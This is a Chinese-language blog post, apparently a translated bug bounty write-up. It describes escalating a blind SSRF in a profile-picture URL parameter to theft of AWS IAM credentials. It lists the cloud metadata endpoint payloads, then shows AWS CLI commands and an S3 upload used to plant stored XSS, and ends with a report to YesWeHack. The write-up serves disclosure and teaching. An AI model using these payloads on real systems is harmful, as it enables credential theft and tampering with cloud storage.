#  从低危Blind SSRF到严重漏洞   
白帽子左一  白帽子左一   2025-01-09 04:00  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
**来****Track安全社区投稿~**  
  
**赢千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
  
**SSRF简介**  
  
服务器端请求伪造（SSRF）是一种Web安全漏洞，它允许攻击者使服务器端应用程序向非预期的位置发送请求。这可能导致攻击者迫使服务器连接到组织内部基础设施中仅限内部访问的服务。在其他情况下，他们可能强迫服务器连接到任意的外部系统。这可能泄露敏感数据，例如授权凭据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEbqEOoDFKz4aWfnrItC3UFDvltux0HVzYsHen8WnOSpctBNVNsOFNJA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
**Blind SSRF简介**  
  
Blind SSRF 漏洞的出现是由于应用程序被诱导向提供的 URL 发出后端 HTTP 请求，但后端请求的响应不会在应用程序的前端响应中返回。  
  
现在我们知道了 SSRF 和Blind SSRF 之间的区别，让我们来看看我的案例……  
  
假设我们有一个漏洞域名 **redacted.com**  
  
我注册并创建了一个新账户。在访问 **https://redacted.com/profile** 后，我发现有两种上传图片的选项：  
  
  
1.**从电脑上传文件**  
  
2.**使用 Facebook 个人资料图片**  
  
  
我尝试了第一个选项（**从电脑上传文件**），并注意到我的图片有一个公开可访问的 URL。在上传图片后，系统提示消息：“您的账户详情已成功更新。”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAETsJBvAzBhk1iaM1VWtAHvP3Dmb5SV4x1mfibaKrTClXUcsQFjIEgQBQw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我发现该图片存储在一个 Amazon S3 存储桶中，并具有不可预测的 URL，这使我可以在没有任何访问限制的情况下访问图片。  
```
<img src="[redacted].s3.region.amazonaws.com/[random_hash].jpeg">
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEW2jicstbmjQKbk8YuJp3J4JEAZbPFo13Be0fEfcAZIwPBicjKHSwx4Cg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
在我访问该 URL 之后  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEh47ewR3lGOUxkib8rVnVA8R3cARF1gVHaL6XTNwHhQzam0cZduJMXVQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
看起来后端处理了图片上传，并将其存储在一个具有公开访问 URL 的 Amazon S3 存储桶中。  
  
在测试了该功能后， 我并未发现任何有趣的东西，除了这一点。于是，我转向了第二个选项（**使用 Facebook 头像**）。但首先，你需要将你的 Facebook 账户与平台账户连接。  
  
在连接了我的 Facebook 账户后，我点击了第二个选项并拦截了请求。我看到一个新的参数叫 profile_picture_url。请求内容是...  
```
POST /profile HTTP/2
Host: account.redacted.com
Content-Type: multipart/form-data; boundary=-------------------------- -154478894334976744053178475009
-----------------------------154478894334976744053178475009
Content-Disposition: form-data; name="first_name"

Attacker
-----------------------------154478894334976744053178475009
Content-Disposition: form-data; name="last_name"

Attacker
-----------------------------154478894334976744053178475009
Content-Disposition: form-data; name="profile_picture_url"

https://scontent.fcai19-12.fna.fbcdn.net/v/t39.30808-1/465664427_1119561922865378_4789856880901123456_n.jpg
-----------------------------154478894334976744053178475009
```  
  
响应内容如下：  
```
{"your account details were successfully updated"}
```  
  
查看源代码后，我发现图片的来源更改为 S3 存储桶中的另一个哈希文件：  
```
<img src="[redacted].s3.region.amazonaws.com/[Different_Random_Hash].jpeg">
```  
  
接着，我将该请求添加到 Repeater 中，尝试测试 profile_picture_url 参数。  
  
首先，我添加了我的协作平台链接以检查是否存在 Blind SSRF 漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEia73pfTMC2sIbDRPXdoZDYPty1h7NQYB905sXgr65vhV3kE6RLcthxg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
然后，我发现了一个惊喜……  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEU42g9qY2IUJ8jtKaOkYMRYhzdcwPI5KtkqiceOVesxGiafvpdM1ymSpg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我收到了来自服务器的 HTTP 和 DNS 交互，因此我立刻访问了 ipinfo.io 以收集有关该 IP 地址的信息，并注意到它来自一个 Amazon AWS 的主机名。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEia0nSkd1ZF0tb9e3OKibWxbLy1nvGPtR9qbxeoSYMKwt73vj0iaPwEpqA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
现在我们发现了一个Blind SSRF，我们可以将其视为信息型/低危漏洞，因为我无法执行内部端口扫描或在没有更多信息的情况下利用它。我只收到响应“您的账户详情已成功更新”，而没有任何额外数据。  
  
然而，根据我在测试第一个选项时记录的笔记——“后端处理了图片上传，并将其存储在 <img> 标签中的 Amazon S3 存储桶内”——  
  
我访问了 https://redacted.com/profile，查看了源代码，并发现了一些不同之处。它将其保存为一个 HTML 文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEeHhQJibQPwGZeSU3K6qEAnK1VFqECs6ZA1WESHy4omSB8D9nribhoE2A/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
访问该 URL 后，我看到了奇迹……  
  
我的协作平台主机的内容竟然出现在了那里！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEDn0lBpMfd276ubyZ3N1h70XXVENPB85twc2P0UMr3K3W1SKj7c3QHg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
这意味着我可以发起内部请求并获取公司 S3 桶中公开保存的数据，而且可以毫无问题地访问这些数据。  
  
由于主机位于 AWS EC2 环境中，我可以注入我的有效载荷 “http://169.254.169.254/latest/meta-data/iam/security-credentials/”以检索 IAM 用户凭证。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAERt67DibozcVCGzRRnukb1qHMiaGc2WMtmHcfhVibLxRY25qeUNojQyvzA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
在访问 <img> 标签中的 URL 后  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAE4E2gwDLOFE8ao54CUl1tzdQicvuDbkkoeDDNCFFibpgI0o0C6t1ohrlw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
在获得用户后，我们可以注入有效负载来窃取 IAM 用户凭证。  
  
"http://169.254.169.254/latest/meta-data/iam/security-credentials/"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEt7TtF3XDvxvgiaDZ4oJ94MLc7cKqicNITgLK7hw41PcFRtAre4AU85Kw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
图像标签中的 URL 是一个 JSON 端点，点我点击后  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAE3vld0Hs7zrMpzJHzLb7kkpPNNT15UUicicibAcCrKicONwBCpvraswm3Ig/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
现在我们能够窃取凭证了 :)  
  
我联系了我的朋友进行合作，帮助寻找更多包含敏感信息的端点，我们一起发现了很多这样的端点。  
  
“http://169.254.169.254/latest/dynamic/instance-identity/document”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEbwU1M3KZSd56xG7v6YC3M4s8woGt7DzHDL9fvnzIBeTuCEHngPFprQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我们能够提取所有这些端点。  
```
http://169.254.169.254/latest/meta-data/block-device-mapping/
http://169.254.169.254/latest/meta-data/security-groups
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/mac
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/signature
http://169.254.169.254/latest/dynamic/instance-identity/pkcs7
http://169.254.169.254/latest/dynamic/instance-identity/rsa2048
```  
  
下一步是专注于访问S3桶，并尝试将其升级为RCE（远程代码执行）或识别任何其他漏洞。  
  
使用凭据访问AWS  
```
export AWS_ACCESS_KEY_ID= [Your_Access_Key]
export AWS_SECRET_ACCESS_KEY= [SecretKey]
export AWS_SESSION_TOKEN= [Token]
export AWS_DEFAULT_REGION= [Region]
```  
  
我们尝试了“get-caller-identity”命令，以返回用于调用该操作的IAM用户或角色的详细信息。  
```
aws sts get-caller-identity
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEGbZuumDXRplmQ3qliaMm3ZibSUasr72yUPicaJSlUVSmLxd6RfBiaLHdvw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我们尝试了命令来获取该桶中上传的文件列表。  
```
aws s3 ls s3://<bucket's_name>
```  
  
我们得到了“权限拒绝”的响应。  
  
我们尝试了几个命令，但不幸的是得到了相同的禁止结果（“权限拒绝”），似乎IAM用户的权限较低。我们还尝试了使用命令上传文件。  
```
echo "POC By Drakenkun & Bedo" > POC.txt
aws s3 CP POC.txt s3://<bucket's_name>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEUVL2EC6V87aVNrbnlhKM2iaPibatfbI6w2Lhx3zJ8NA95S0as9OelUxw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
访问 URL “https://[redacted].s3.region.amazonaws.com/POC.txt” 后  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAERIVTF6AUCMR38j2aNh3prSppZXlzgG4icgllVqTt5BmbXT1adm5J5RQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我们尝试上传一个简单的 HTML 文件，其中包含通过 JavaScript 显示警告消息的代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSG1vWNWZbMrK1a2aYkN3LAEsKxIjI1Mdk0azdoLR9uGbHr4WJ3Qcay5YFCvqkAvpYIdyDF4bojVRQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
现在我们成功实现了存储型 XSS。 :)  
  
此外，我们还发现我们拥有“删除”权限，允许我们从 S3 存储桶中删除任何内容。  
  
该平台的商业模型使用户能够创建 POST 请求，公开出售或出租物品。平台上的每个图像，包括个人资料照片，都存储在该 S3 存储桶中，这使我们能够修改或删除它们。  
  
最后，我们将报告提交给 YesWeHack 平台，平台接受了这个作为一个关键漏洞，并给予了我们丰厚的奖励 (€€€€)。  
  
**声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学********习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。所有渗透都需获取授权！**  
  
**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk安全知识星球,我们一起进步一起学习。星球不定期会分享一些前沿漏洞，每周安全面试经验、SRC实战纪实等文章分享，微信识别二维码，即可加入。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFIJlRFYoItlJDrScxuTPmfnqibC1ApJ2OKh5sF41qicCo5AvQ4icuG8kbqQxZ5HVypvJ8jZDzsmD37Q/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
